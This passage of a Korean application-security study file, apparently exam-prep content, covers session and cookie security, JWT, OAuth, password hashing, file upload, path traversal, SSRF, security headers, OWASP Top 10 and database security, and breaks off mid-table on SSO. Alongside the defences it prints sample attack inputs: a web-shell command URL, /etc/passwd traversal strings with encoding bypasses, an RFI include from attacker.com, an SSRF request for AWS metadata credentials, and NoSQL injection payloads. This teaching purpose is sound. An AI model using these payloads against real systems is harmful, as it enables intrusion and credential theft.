    subjectLabel: '어플리케이션보안',
    chapter: 'web-session-auth',
    chapterLabel: '세션·인증 보안',
    keywords: ['세션 하이재킹', '세션 고정', 'Session Fixation', '쿠키', 'JWT', '토큰', '인증', '세션 관리', 'Secure 속성', 'HttpOnly', 'SameSite', 'OAuth', 'PKCE', '비밀번호 해시', 'bcrypt'],
    content: `

<h3>세션 관리 취약점</h3>
<table>
  <thead><tr><th>취약점</th><th>공격 방법</th><th>방어</th></tr></thead>
  <tbody>
    <tr><td><strong>세션 하이재킹</strong></td><td>예측 가능한 세션 ID 생성 / XSS·스니핑으로 세션 ID 탈취 후 위장</td><td>HTTPS, HttpOnly+Secure 쿠키, 충분한 엔트로피의 랜덤 세션 ID</td></tr>
    <tr><td><strong>세션 고정 (Session Fixation)</strong></td><td>공격자가 세션 ID를 미리 설정 → 피해자가 같은 ID로 로그인하면 세션 탈취</td><td>로그인 후 세션 ID 반드시 재생성</td></tr>
    <tr><td><strong>세션 예측</strong></td><td>취약한 세션 ID 생성 알고리즘(타임스탬프 등)으로 다음 세션 ID 예측</td><td>CSPRNG(암호학적 난수) 기반 세션 ID</td></tr>
  </tbody>
</table>

<h3>쿠키 보안 속성</h3>
<table>
  <thead><tr><th>속성</th><th>역할</th><th>누락 시 위험</th></tr></thead>
  <tbody>
    <tr><td><strong>Secure</strong></td><td>HTTPS에서만 전송</td><td>HTTP 구간에서 쿠키 스니핑 가능</td></tr>
    <tr><td><strong>HttpOnly</strong></td><td>JavaScript 쿠키 접근 차단</td><td>XSS로 세션 쿠키 탈취 가능</td></tr>
    <tr><td><strong>SameSite=Strict</strong></td><td>크로스 사이트 요청에 쿠키 미전송</td><td>CSRF 공격 가능</td></tr>
    <tr><td><strong>SameSite=Lax</strong></td><td>GET 탐색 허용, POST 등 차단</td><td>일부 CSRF 위험 존재</td></tr>
    <tr><td><strong>Domain</strong></td><td>쿠키 전송 도메인 범위 제한</td><td>서브도메인 포함 시 범위 확대</td></tr>
    <tr><td><strong>Expires/Max-Age</strong></td><td>쿠키 만료 시간 설정</td><td>세션 쿠키가 영구 저장될 수 있음</td></tr>
  </tbody>
</table>

<h3>JWT (JSON Web Token)</h3>
<p>서버 세션 없이 토큰으로 인증 상태를 전달하는 방식. Header.Payload.Signature 세 부분으로 구성.</p>
<pre><code>Header:    {"alg": "HS256", "typ": "JWT"}  → Base64URL 인코딩
Payload:   {"sub": "user123", "exp": 1700000000}  → Base64URL 인코딩
Signature: HMACSHA256(header + "." + payload, secret)</code></pre>

<h4>JWT 주요 취약점</h4>
<ul>
  <li><strong>alg:none 공격</strong>: 헤더의 알고리즘을 "none"으로 변조해 서명 검증 우회 시도. 서버는 반드시 알고리즘을 강제 지정해야 함.</li>
  <li><strong>약한 서명 키</strong>: 단순 문자열 시크릿은 브루트포스 가능. 충분한 길이의 랜덤 키 사용.</li>
  <li><strong>만료 검증 누락</strong>: exp 클레임 검증 누락 시 만료된 토큰 재사용 가능.</li>
</ul>

<h3>OAuth 2.0 흐름</h3>
<table>
  <thead><tr><th>Grant Type</th><th>흐름</th><th>적합 용도</th></tr></thead>
  <tbody>
    <tr><td><strong>Authorization Code</strong></td><td>인가 코드 → 서버에서 액세스 토큰 교환</td><td>웹 애플리케이션 (가장 안전)</td></tr>
    <tr><td><strong>Authorization Code + PKCE</strong></td><td>코드 챌린지로 코드 탈취 방지</td><td>SPA, 모바일 앱</td></tr>
    <tr><td><strong>Implicit (deprecated)</strong></td><td>URL 프래그먼트로 직접 토큰 발급</td><td>사용 금지 — 토큰 노출 위험</td></tr>
    <tr><td><strong>Client Credentials</strong></td><td>클라이언트 자격증명으로 토큰 발급</td><td>서버-서버 통신 (사용자 없음)</td></tr>
  </tbody>
</table>

<h3>비밀번호 저장</h3>
<table>
  <thead><tr><th>방식</th><th>안전성</th><th>이유</th></tr></thead>
  <tbody>
    <tr><td>평문 저장</td><td>매우 위험</td><td>DB 유출 시 즉시 노출</td></tr>
    <tr><td>MD5 / SHA-1 해시</td><td>취약</td><td>레인보우 테이블, GPU 브루트포스에 취약</td></tr>
    <tr><td>SHA-256 단순 해시</td><td>취약</td><td>솔트 없으면 동일 비밀번호 → 동일 해시</td></tr>
    <tr><td><strong>bcrypt</strong></td><td>권장</td><td>솔트 내장, 반복 횟수(cost) 조절 가능</td></tr>
    <tr><td><strong>PBKDF2</strong></td><td>권장</td><td>반복 해시, NIST 권고</td></tr>
    <tr><td><strong>Argon2</strong></td><td>권장</td><td>Password Hashing Competition 우승. 메모리 집약적.</td></tr>
  </tbody>
</table>

<h3>다중인증 (MFA)</h3>
<ul>
  <li><strong>TOTP (Time-based OTP)</strong>: 현재 시간 기반 6자리 코드. 30초마다 갱신. (Google Authenticator 방식)</li>
  <li><strong>HOTP (HMAC-based OTP)</strong>: 카운터 기반 OTP. 사용할 때마다 카운터 증가.</li>
  <li><strong>하드웨어 토큰</strong>: 물리적 기기에서 OTP 생성. 높은 보안성.</li>
  <li><strong>SMS OTP</strong>: SIM 스와핑 공격 위험 — 가능하면 TOTP 앱으로 대체 권장.</li>
</ul>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'file-upload-traversal',
    chapterLabel: '파일 업로드·경로 취약점',
    keywords: ['파일 업로드', '웹셸', 'Web Shell', '디렉토리 트래버설', 'Path Traversal', '../', 'MIME', '확장자 검증', 'SSRF', 'Open Redirect', '파일 포함', 'LFI', 'RFI'],
    content: `

<h3>파일 업로드 취약점</h3>
<p>악성 파일(웹셸: .php/.jsp/.asp)을 서버에 업로드 후 웹 URL로 접근해 원격 코드 실행(RCE).</p>
<pre><code>공격 흐름:
1. 파일명 변조: image.php.jpg → 서버가 php로 실행
2. Content-Type 변조: image/jpeg로 위장
3. 이중 확장자: shell.php.jpg → 설정 오류 시 php 실행
4. 업로드 후: https://victim.com/uploads/shell.php?cmd=whoami</code></pre>

<h4>파일 업로드 방어</h4>
<table>
  <thead><tr><th>방어 기법</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td><strong>확장자 화이트리스트</strong></td><td>jpg, png, gif, pdf 등 허용 확장자만 통과. 블랙리스트 방식 금지.</td></tr>
    <tr><td><strong>MIME 타입 검증</strong></td><td>Content-Type 헤더 검증. 단, 조작 가능하므로 매직 바이트도 병행.</td></tr>
    <tr><td><strong>매직 바이트 확인</strong></td><td>파일 시작 바이트로 실제 파일 형식 확인. (JPG: FF D8 FF)</td></tr>
    <tr><td><strong>저장 경로 분리</strong></td><td>웹 루트 외부 디렉토리에 저장. 직접 실행 불가하게.</td></tr>
    <tr><td><strong>파일명 랜덤화</strong></td><td>원본 파일명 대신 UUID 등 랜덤 이름으로 저장.</td></tr>
    <tr><td><strong>실행 권한 제거</strong></td><td>업로드 디렉토리에 실행(Execute) 권한 부여하지 않음.</td></tr>
  </tbody>
</table>

<h3>디렉토리 트래버설 (Path Traversal)</h3>
<p>../을 이용해 웹 루트 외부의 임의 파일에 접근. URL 인코딩으로 필터 우회 시도.</p>
<pre><code>기본 공격:
  http://example.com/view?file=../../../../etc/passwd

URL 인코딩 우회:
  %2e%2e%2f = ../
  http://example.com/view?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd

이중 인코딩:
  %252e%252e%252f = ../  (서버가 두 번 디코딩할 때)</code></pre>
<p><strong>방어</strong>: 경로 정규화(canonicalize) 후 허용 기준 디렉토리 내부인지 검증, 화이트리스트 파일명 사용.</p>

<h3>LFI / RFI (파일 포함 취약점)</h3>
<table>
  <thead><tr><th>유형</th><th>설명</th><th>예시</th></tr></thead>
  <tbody>
    <tr><td><strong>LFI (Local File Inclusion)</strong></td><td>서버 로컬 파일을 코드로 포함해 실행</td><td>?page=../../etc/passwd</td></tr>
    <tr><td><strong>RFI (Remote File Inclusion)</strong></td><td>원격 URL의 파일을 코드로 포함해 실행</td><td>?page=http://attacker.com/shell.php</td></tr>
  </tbody>
</table>
<p><strong>방어</strong>: include() 함수에 사용자 입력 직접 전달 금지, allow_url_include 비활성화, 허용 파일 목록 화이트리스트.</p>

<h3>SSRF (Server-Side Request Forgery)</h3>
<p>서버가 공격자 지정 URL로 요청을 보내게 만들어 내부망 서비스 접근 또는 클라우드 메타데이터 탈취.</p>
<pre><code>-- 클라우드 메타데이터 탈취 (AWS)
URL 파라미터: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

-- 내부 서비스 스캔
url=http://192.168.1.1:22    (SSH 포트 확인)
url=http://localhost:8080/admin</code></pre>
<p><strong>방어</strong>: 허용 URL 화이트리스트, 내부 IP 대역(10.x, 172.16.x, 192.168.x, 169.254.x) 차단, DNS Rebinding 방어.</p>

<h3>Open Redirect</h3>
<p>신뢰할 수 있는 도메인의 리다이렉트 파라미터를 조작해 악성 사이트로 유도. 피싱에 악용.</p>
<pre><code>정상: https://legitimate.com/login?next=/dashboard
공격: https://legitimate.com/login?next=https://evil.com

피싱 URL 예: https://trusted-bank.com/redirect?url=https://evil-bank.com</code></pre>
<p><strong>방어</strong>: 리다이렉트 대상을 화이트리스트 도메인으로 제한, 상대 경로만 허용, 외부 URL 리다이렉트 금지.</p>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'http-security',
    chapterLabel: 'HTTP 보안 헤더',
    keywords: ['HTTPS', 'HSTS', 'CSP', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Permissions-Policy', 'CORS', 'SOP', 'Same-Origin Policy', 'Mixed Content', 'TLS', 'HTTP/2', 'HTTP/3'],
    content: `

<h3>보안 HTTP 헤더 정리</h3>
<table>
  <thead><tr><th>헤더</th><th>권장값</th><th>역할</th><th>미설정 시 위험</th></tr></thead>
  <tbody>
    <tr>
      <td><strong>Strict-Transport-Security (HSTS)</strong></td>
      <td>max-age=31536000; includeSubDomains; preload</td>
      <td>HTTPS 강제. HTTP 요청을 자동으로 HTTPS로 전환.</td>
      <td>HTTP 다운그레이드 공격, SSL Stripping</td>
    </tr>
    <tr>
      <td><strong>Content-Security-Policy (CSP)</strong></td>
      <td>default-src 'self'; script-src 'self' 'nonce-xxx'</td>
      <td>허용 리소스 출처 제한. 인라인 스크립트 통제.</td>
      <td>XSS, 인젝션 공격</td>
    </tr>
    <tr>
      <td><strong>X-Frame-Options</strong></td>
      <td>DENY 또는 SAMEORIGIN</td>
      <td>iframe 내 페이지 로딩 제한.</td>
      <td>Clickjacking 공격</td>
    </tr>
    <tr>
      <td><strong>X-Content-Type-Options</strong></td>
      <td>nosniff</td>
      <td>브라우저 MIME 스니핑 방지. Content-Type 강제 준수.</td>
      <td>MIME 타입 혼동 공격</td>
    </tr>
    <tr>
      <td><strong>Referrer-Policy</strong></td>
      <td>strict-origin-when-cross-origin</td>
      <td>Referer 헤더 전송 범위 제어. 민감 URL 누출 방지.</td>
      <td>내부 URL, 토큰 등 정보 누출</td>
    </tr>
    <tr>
      <td><strong>Permissions-Policy</strong></td>
      <td>camera=(), microphone=(), geolocation=()</td>
      <td>브라우저 기능(카메라·마이크·위치 등) 사용 제한.</td>
      <td>사용자 동의 없는 기능 접근</td>
    </tr>
  </tbody>
</table>

<h4>HSTS 세부 설명</h4>
<ul>
  <li><strong>max-age</strong>: HSTS 정책 유효 기간 (초). 31536000 = 1년.</li>
  <li><strong>includeSubDomains</strong>: 서브도메인에도 HSTS 적용.</li>
  <li><strong>preload</strong>: 브라우저 HSTS 프리로드 목록에 등록 신청 가능. 첫 방문도 HTTPS 강제.</li>
</ul>

<h4>CSP 주요 디렉티브</h4>
<table>
  <thead><tr><th>디렉티브</th><th>설명</th></tr></thead>
  <tbody>
    <tr><td>default-src</td><td>모든 리소스의 기본 출처 정책</td></tr>
    <tr><td>script-src</td><td>JavaScript 출처 제한. 'self', 'nonce-값', 도메인 지정.</td></tr>
    <tr><td>style-src</td><td>CSS 출처 제한</td></tr>
    <tr><td>img-src</td><td>이미지 출처 제한</td></tr>
    <tr><td>frame-ancestors</td><td>X-Frame-Options 대체. 부모 프레임 허용 출처 지정.</td></tr>
    <tr><td>report-uri</td><td>CSP 위반 보고서 전송 엔드포인트</td></tr>
  </tbody>
</table>

<h3>SOP (Same-Origin Policy)</h3>
<p>브라우저 보안 정책. 한 출처(프로토콜+도메인+포트)의 스크립트는 다른 출처의 리소스에 접근 불가.</p>
<pre><code>같은 출처: https://example.com/a  vs  https://example.com/b  → 허용
다른 출처: https://example.com    vs  http://example.com     → 차단 (프로토콜 다름)
          https://example.com    vs  https://sub.example.com → 차단 (서브도메인)</code></pre>

<h3>CORS (Cross-Origin Resource Sharing)</h3>
<p>SOP 예외를 서버가 명시적으로 허용하는 메커니즘.</p>
<table>
  <thead><tr><th>구분</th><th>조건</th><th>동작</th></tr></thead>
  <tbody>
    <tr><td><strong>Simple Request</strong></td><td>GET/POST + 단순 헤더 + 단순 Content-Type</td><td>Preflight 없이 바로 요청 전송</td></tr>
    <tr><td><strong>Preflight Request</strong></td><td>PUT/DELETE/커스텀 헤더/JSON Content-Type 등</td><td>OPTIONS 요청으로 먼저 허가 확인 후 본 요청</td></tr>
  </tbody>
</table>
<p><strong>주의</strong>: Access-Control-Allow-Origin: * 는 인증 정보(쿠키)와 함께 사용 불가. 특정 도메인만 허용할 것.</p>

<h3>Mixed Content</h3>
<p>HTTPS 페이지에서 HTTP로 리소스(이미지·스크립트·스타일)를 로드. 보안 연결 무력화.</p>
<ul>
  <li><strong>Active Mixed Content</strong>: 스크립트·CSS·iframe 등. 브라우저가 차단.</li>
  <li><strong>Passive Mixed Content</strong>: 이미지·오디오·비디오. 경고만 표시.</li>
</ul>
<p><strong>방어</strong>: 모든 리소스를 HTTPS로 제공, HSTS 적용, upgrade-insecure-requests CSP 디렉티브 사용.</p>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'owasp-secure-coding',
    chapterLabel: 'OWASP·시큐어 코딩',
    keywords: ['OWASP', 'OWASP Top 10', '시큐어 코딩', 'Secure Coding', '입력값 검증', '출력값 인코딩', '오류 처리', '로깅', '암호화', '취약한 의존성', 'SAST', 'DAST', 'SCA', 'DevSecOps', 'SDL'],
    content: `

<h3>OWASP Top 10 (2021)</h3>
<table>
  <thead><tr><th>순위</th><th>항목</th><th>대표 예시</th><th>핵심 방어</th></tr></thead>
  <tbody>
    <tr><td>A01</td><td><strong>취약한 접근 통제</strong> (Broken Access Control)</td><td>수평/수직 권한 상승, 강제 브라우징</td><td>서버 측 접근 통제, 최소 권한</td></tr>
    <tr><td>A02</td><td><strong>암호화 실패</strong> (Cryptographic Failures)</td><td>평문 전송, 취약 암호화(MD5/SHA1)</td><td>TLS 강제, 강력한 해시 알고리즘</td></tr>
    <tr><td>A03</td><td><strong>인젝션</strong> (Injection)</td><td>SQL·OS·LDAP 인젝션</td><td>Prepared Statement, 입력 검증</td></tr>
    <tr><td>A04</td><td><strong>안전하지 않은 설계</strong> (Insecure Design)</td><td>위협 모델링 미수행, 보안 설계 부재</td><td>SDL, 위협 모델링, 보안 요구사항 정의</td></tr>
    <tr><td>A05</td><td><strong>보안 설정 오류</strong> (Security Misconfiguration)</td><td>기본 계정, 불필요 기능 활성화, 오류 노출</td><td>최소 설치, 보안 기본값, 오류 메시지 제거</td></tr>
    <tr><td>A06</td><td><strong>취약하고 오래된 구성요소</strong></td><td>패치 안 된 라이브러리, EOL 소프트웨어</td><td>SCA, 의존성 관리, 주기적 패치</td></tr>
    <tr><td>A07</td><td><strong>식별 및 인증 실패</strong></td><td>무차별 대입 허용, 세션 관리 취약</td><td>MFA, 강력한 세션 관리, 잠금 정책</td></tr>
    <tr><td>A08</td><td><strong>소프트웨어 및 데이터 무결성 실패</strong></td><td>안전하지 않은 역직렬화, 공급망 공격</td><td>디지털 서명 검증, 신뢰 소프트웨어만 사용</td></tr>
    <tr><td>A09</td><td><strong>보안 로깅 및 모니터링 실패</strong></td><td>침해 미탐지, 로그 부재</td><td>중앙 로깅, 이상 탐지, 인시던트 대응</td></tr>
    <tr><td>A10</td><td><strong>서버 측 요청 위조</strong> (SSRF)</td><td>내부 서비스 접근, 메타데이터 탈취</td><td>URL 화이트리스트, 내부 IP 차단</td></tr>
  </tbody>
</table>

<h3>시큐어 코딩 7대 원칙</h3>
<table>
  <thead><tr><th>원칙</th><th>핵심 내용</th></tr></thead>
  <tbody>
    <tr><td><strong>입력값 검증</strong></td><td>모든 외부 입력을 신뢰하지 않음. 화이트리스트 기반 검증.</td></tr>
    <tr><td><strong>출력값 인코딩</strong></td><td>HTML·SQL·OS 명령 등 컨텍스트에 맞는 인코딩 적용.</td></tr>
    <tr><td><strong>인증·세션 관리</strong></td><td>강력한 인증, 안전한 세션 생성·소멸, MFA 적용.</td></tr>
    <tr><td><strong>접근통제</strong></td><td>최소 권한 원칙, 서버 측 권한 검증, 기능 수준 접근 제어.</td></tr>
    <tr><td><strong>암호화</strong></td><td>민감 데이터 암호화, 강력한 알고리즘 사용, 키 관리.</td></tr>
    <tr><td><strong>오류 처리</strong></td><td>스택 트레이스·DB 오류 노출 금지. 사용자에게는 일반 메시지만.</td></tr>
    <tr><td><strong>보안 설정</strong></td><td>기본값 최소화, 불필요 기능 비활성화, 보안 헤더 적용.</td></tr>
  </tbody>
</table>

<h3>보안 테스트 도구 비교</h3>
<table>
  <thead><tr><th>구분</th><th>방식</th><th>시점</th><th>특징</th><th>대표 도구</th></tr></thead>
  <tbody>
    <tr><td><strong>SAST</strong> (정적 분석)</td><td>소스코드 분석</td><td>개발 단계</td><td>빠른 피드백, 실행 불필요. 오탐 많음.</td><td>SonarQube, Checkmarx, Fortify</td></tr>
    <tr><td><strong>DAST</strong> (동적 분석)</td><td>실행 중 앱 공격</td><td>테스트·운영 단계</td><td>실제 취약점 확인. 소스코드 불필요.</td><td>OWASP ZAP, Burp Suite</td></tr>
    <tr><td><strong>IAST</strong> (대화형 분석)</td><td>에이전트 삽입 후 런타임 분석</td><td>QA 단계</td><td>정확도 높음. SAST+DAST 장점 결합.</td><td>Contrast Security</td></tr>
    <tr><td><strong>SCA</strong> (소프트웨어 구성 분석)</td><td>의존성 라이브러리 취약점 검사</td><td>개발·CI 단계</td><td>오픈소스 취약점(CVE) 탐지.</td><td>Snyk, OWASP Dependency-Check</td></tr>
  </tbody>
</table>

<h3>SDL (Secure Development Lifecycle)</h3>
<table>
  <thead><tr><th>단계</th><th>주요 보안 활동</th></tr></thead>
  <tbody>
    <tr><td><strong>요구사항</strong></td><td>보안 요구사항 정의, 규정 준수 확인</td></tr>
    <tr><td><strong>설계</strong></td><td>위협 모델링(STRIDE), 보안 아키텍처 검토</td></tr>
    <tr><td><strong>구현</strong></td><td>시큐어 코딩 가이드 준수, SAST 적용</td></tr>
    <tr><td><strong>테스트</strong></td><td>DAST, 침투 테스트, SCA, 코드 리뷰</td></tr>
    <tr><td><strong>배포</strong></td><td>보안 설정 검토, 취약점 스캔</td></tr>
    <tr><td><strong>운영</strong></td><td>모니터링, 패치 관리, 인시던트 대응</td></tr>
  </tbody>
</table>

<h3>DevSecOps</h3>
<p>CI/CD 파이프라인에 보안 자동화를 삽입. "Shift Left" — 보안 검증을 개발 초기로 이동.</p>
<ul>
  <li>코드 커밋 → SAST 자동 실행</li>
  <li>빌드 → SCA (의존성 취약점 스캔)</li>
  <li>스테이징 배포 → DAST 자동 실행</li>
  <li>운영 → 런타임 모니터링·RASP</li>
</ul>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'db-security',
    chapterLabel: 'DB 보안',
    keywords: ['SQL Injection', 'DB 접근통제', '권한', 'GRANT', 'REVOKE', 'DB 감사', '뷰', '저장 프로시저', 'DB 암호화', 'TDE', '컬럼 암호화', '데이터 마스킹', 'NoSQL Injection', 'MongoDB'],
    content: `

<h3>DB 접근통제</h3>
<h4>최소 권한 원칙 및 계정 관리</h4>
<ul>
  <li><strong>최소 권한</strong>: 애플리케이션 계정에 필요한 권한만 부여. SELECT만 필요하면 SELECT만.</li>
  <li><strong>계정 분리</strong>: DBA 계정, 운영 계정, 읽기 전용 계정 분리 운영.</li>
  <li><strong>기본 계정 변경</strong>: sa(SQL Server), sys/system(Oracle), root(MySQL) 기본 패스워드 즉시 변경.</li>
</ul>

<h4>GRANT / REVOKE</h4>
<pre><code>-- 권한 부여
GRANT SELECT, INSERT ON orders TO appuser;
GRANT SELECT ON salary TO manager WITH GRANT OPTION;

-- 권한 회수
REVOKE INSERT ON orders FROM appuser;
REVOKE SELECT ON salary FROM manager CASCADE;</code></pre>
<ul>
  <li><strong>WITH GRANT OPTION</strong>: 받은 권한을 타인에게도 부여 가능</li>
  <li><strong>CASCADE</strong>: 위임한 권한까지 연쇄 회수</li>
</ul>

<h4>역할(Role) 기반 권한 관리</h4>
<pre><code>CREATE ROLE readonly_role;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_role;
GRANT readonly_role TO user1, user2;</code></pre>

<h3>DB 보안 위협 비교</h3>
<table>
  <thead><tr><th>위협</th><th>공격 방법</th><th>대응</th></tr></thead>
  <tbody>
    <tr><td><strong>SQL Injection</strong></td><td>입력값에 SQL 구문 삽입, 인증 우회·데이터 추출</td><td>Prepared Statement, 입력 검증, WAF</td></tr>
    <tr><td><strong>권한 남용</strong></td><td>내부자가 권한을 이용해 민감 데이터 무단 조회·유출</td><td>최소 권한, 직무 분리, DB 감사, DAM</td></tr>
    <tr><td><strong>도청</strong></td><td>DB 서버와 앱 서버 간 통신 스니핑</td><td>TLS 암호화 통신</td></tr>
    <tr><td><strong>백업 노출</strong></td><td>백업 파일 비암호화 상태로 유출</td><td>백업 파일 암호화, 접근 제어</td></tr>
    <tr><td><strong>내부자 위협</strong></td><td>합법적 접근 권한 남용</td><td>직무 분리, 감사 로그, DAM</td></tr>
  </tbody>
</table>

<h3>DB 암호화</h3>
<table>
  <thead><tr><th>방식</th><th>암·복호화 위치</th><th>장점</th><th>단점</th></tr></thead>
  <tbody>
    <tr><td><strong>API 방식</strong></td><td>응용 프로그램</td><td>DB 서버 부하 없음. DB 변경 없음.</td><td>소스코드 수정 필요. 키 관리 복잡.</td></tr>
    <tr><td><strong>플러그인 방식</strong></td><td>DB 서버 외부 모듈</td><td>소스코드 수정 최소화.</td><td>DB 성능 영향. 추가 라이선스.</td></tr>
    <tr><td><strong>TDE (Transparent Data Encryption)</strong></td><td>DB 엔진</td><td>애플리케이션 변경 없음. 파일 레벨 암호화.</td><td>메모리는 평문. SQL Injection 방어 안 됨.</td></tr>
    <tr><td><strong>파일 시스템 암호화</strong></td><td>OS/파일 시스템</td><td>DB 수정 없음.</td><td>DB 레벨 공격 방어 안 됨.</td></tr>
  </tbody>
</table>

<h3>데이터 마스킹</h3>
<table>
  <thead><tr><th>유형</th><th>설명</th><th>용도</th></tr></thead>
  <tbody>
    <tr><td><strong>정적 마스킹</strong></td><td>원본 DB를 복사해 민감 데이터를 변환한 별도 DB 생성</td><td>개발·테스트 환경 제공</td></tr>
    <tr><td><strong>동적 마스킹</strong></td><td>조회 시점에 실시간으로 마스킹 적용. 원본 DB 보존.</td><td>운영 환경에서 비권한자 조회 제한</td></tr>
  </tbody>
</table>

<h3>DB 감사 (Audit)</h3>
<p>DB 접근·변경 내역 로깅. 사후 추적·이상 탐지·컴플라이언스 목적.</p>
<ul>
  <li><strong>감사 대상</strong>: 로그인/로그아웃, DDL 수행, 권한 변경, 대용량 조회, 민감 테이블 접근</li>
  <li><strong>감사 로그 보관</strong>: 개인정보 처리 시스템은 접속 기록 <strong>최소 6개월</strong> 보관 (개인정보보호법)</li>
  <li><strong>DAM (Database Activity Monitoring)</strong>: 실시간 DB 트래픽 모니터링. 이상 쿼리 탐지·차단.</li>
</ul>

<h3>NoSQL 보안</h3>
<p>MongoDB 등 NoSQL DB도 인젝션 공격에 취약. JSON/BSON 구조 이용.</p>
<pre><code>-- MongoDB Injection: $where 연산자 악용
db.users.find({$where: "this.password == '" + input + "'"})
공격 입력: ' || '1'=='1  →  항상 참 조건

-- $gt 연산자 악용 (JSON 형태 입력)
{"username": "admin", "password": {"$gt": ""}}  →  패스워드 항상 참</code></pre>
<p><strong>방어</strong>: 사용자 입력을 연산자로 사용 금지, $where 비활성화, 입력 타입 검증, mongoose 등 ODM 사용.</p>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'ecommerce-security',
    chapterLabel: '전자상거래 보안',
    keywords: ['전자상거래', '전자서명', '공인인증서', '전자문서', '부인방지', 'SET', 'SSL/TLS', 'PCI-DSS', '전자결제', 'PG사', 'OTP', '전자화폐', '전자수표', 'PKI'],
    content: `

<h3>전자상거래 보안 요구사항</h3>
<table>
  <thead><tr><th>요구사항</th><th>설명</th><th>구현 기술</th></tr></thead>
  <tbody>
    <tr><td><strong>기밀성</strong></td><td>거래 정보가 제3자에게 노출되지 않음</td><td>SSL/TLS 암호화</td></tr>
    <tr><td><strong>무결성</strong></td><td>전송 중 데이터 변조 방지</td><td>전자서명, 해시</td></tr>
    <tr><td><strong>인증</strong></td><td>거래 당사자 신원 확인</td><td>공인인증서, PKI</td></tr>
    <tr><td><strong>부인방지</strong></td><td>거래 사실 부인 불가</td><td>전자서명 (개인키로 서명)</td></tr>
    <tr><td><strong>가용성</strong></td><td>언제든 서비스 이용 가능</td><td>이중화, DDoS 방어</td></tr>
  </tbody>
</table>

<h3>SET (Secure Electronic Transaction)</h3>
<p>Visa·MasterCard가 정의한 인터넷 카드 결제 표준. 고객·상점·카드사 3자 구조. 현재는 SSL/TLS로 대체.</p>
<h4>이중 서명 (Dual Signature)</h4>
<p>고객이 주문 정보(상점에게)와 카드 정보(카드사에게)를 함께 서명. 상점은 카드 정보를, 카드사는 주문 상세를 볼 수 없음. 개인정보 최소 노출.</p>
<pre><code>PI = 결제 정보 (카드번호 등)  →  카드사만 확인
OI = 주문 정보 (상품·금액)    →  상점만 확인
이중 서명 = Hash(Hash(PI) + Hash(OI)) → 고객 개인키로 서명</code></pre>

<h4>SSL/TLS 기반 결제 vs SET 비교</h4>
<table>
  <thead><tr><th>항목</th><th>SSL/TLS 결제</th><th>SET</th></tr></thead>
  <tbody>
    <tr><td>복잡성</td><td>낮음</td><td>높음 (3자 PKI 필요)</td></tr>
    <tr><td>보급성</td><td>현재 표준</td><td>사실상 미사용</td></tr>
    <tr><td>상점의 카드정보 접근</td><td>가능 (PG사가 중간 처리)</td><td>불가 (이중 서명으로 분리)</td></tr>
    <tr><td>고객 인증서</td><td>불필요</td><td>필요</td></tr>
  </tbody>
</table>

<h3>PCI-DSS (Payment Card Industry Data Security Standard)</h3>
<p>카드 정보 보호를 위한 국제 표준. 카드 가맹점·서비스 제공자가 준수해야 할 12개 요구사항.</p>
<table>
  <thead><tr><th>영역</th><th>주요 요구사항</th></tr></thead>
  <tbody>
    <tr><td>네트워크 보안</td><td>방화벽 설치·유지, 기본 패스워드 변경</td></tr>
    <tr><td>카드 데이터 보호</td><td>저장 카드 데이터 보호, 전송 시 암호화</td></tr>
    <tr><td>취약점 관리</td><td>악성코드 방어, 안전한 개발 유지</td></tr>
    <tr><td>접근 통제</td><td>최소 권한, 고유 사용자 ID, 물리적 접근 제한</td></tr>
    <tr><td>모니터링·테스트</td><td>접근 로그 모니터링, 보안 시스템 테스트</td></tr>
    <tr><td>정보보안 정책</td><td>보안 정책 수립·유지</td></tr>
  </tbody>
</table>

<h3>전자화폐·전자수표·전자어음</h3>
<table>
  <thead><tr><th>유형</th><th>설명</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>전자화폐</strong></td><td>화폐 가치를 전자적으로 저장. IC카드·네트워크형.</td><td>익명성 가능. 소액 결제.</td></tr>
    <tr><td><strong>전자수표</strong></td><td>종이 수표를 전자화. 전자서명으로 발행.</td><td>고액 결제. 부인방지 강함.</td></tr>
    <tr><td><strong>전자어음</strong></td><td>약속어음을 전자화. 전자어음관리기관에 등록.</td><td>법적 효력. 분실·위조 방지.</td></tr>
  </tbody>
</table>

<h3>전자서명법 핵심</h3>
<ul>
  <li><strong>전자서명의 법적 효력</strong>: 서명자의 신원 확인, 서명 후 내용 변경 여부 확인 가능 시 법적 효력 인정.</li>
  <li><strong>공인전자문서센터</strong>: 전자문서를 안전하게 보관·유통·증명하는 공인기관.</li>
  <li><strong>타임스탬프</strong>: 전자문서가 특정 시점에 존재했음을 증명. 부인방지 보완.</li>
</ul>

<h3>OTP (One-Time Password)</h3>
<table>
  <thead><tr><th>유형</th><th>생성 기준</th><th>알고리즘</th><th>특징</th></tr></thead>
  <tbody>
    <tr><td><strong>HOTP</strong></td><td>횟수(카운터) 기반</td><td>HMAC-SHA1(K, C)</td><td>사용할 때마다 카운터 증가. 동기화 필요.</td></tr>
    <tr><td><strong>TOTP</strong></td><td>시간 기반 (30초 단위)</td><td>HMAC-SHA1(K, T)</td><td>Google Authenticator 방식. 시계 동기화 필요.</td></tr>
    <tr><td><strong>하드웨어 토큰</strong></td><td>전용 기기에서 생성</td><td>—</td><td>높은 보안성. 분실 위험.</td></tr>
  </tbody>
</table>
    `,
  },

  {
    subject: 'application',
    subjectLabel: '어플리케이션보안',
    chapter: 'auth-sso',
    chapterLabel: '인증·SSO·접근통제',
    keywords: ['SSO', 'Single Sign-On', 'SAML', 'OAuth', 'OpenID Connect', 'Kerberos', 'RADIUS', 'LDAP', 'Active Directory', '커버로스', '티켓', 'TGT', '2FA', 'MFA', 'FIDO', 'WebAuthn'],
    content: `

<h3>SSO (Single Sign-On)</h3>
<p>한 번의 로그인으로 여러 서비스를 이용. 인증 정보를 중앙 IdP(Identity Provider)가 관리.</p>
<table>
  <thead><tr><th>장점</th><th>단점</th></tr></thead>
  <tbody>
